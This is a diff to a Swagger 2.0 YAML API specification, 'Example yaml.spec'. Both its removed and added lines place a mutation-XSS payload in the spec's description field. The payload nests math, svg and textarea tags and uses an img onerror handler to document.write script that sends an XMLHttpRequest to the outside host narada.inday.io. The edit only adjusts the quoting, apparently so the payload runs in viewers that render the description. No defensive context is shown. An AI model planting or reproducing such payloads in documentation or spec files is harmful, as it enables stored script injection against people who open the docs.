@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='document.write('var req = new XMLHttpRequest(); req.addEventListener("load", reqListener); req.open("GET", "https://narada.inday.io"); req.send();')'>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror=document.write('var req = new XMLHttpRequest(); req.addEventListener("load", reqListener); req.open("GET", "https://narada.inday.io"); req.send();)'>">
 paths:
   /accounts:
     get:
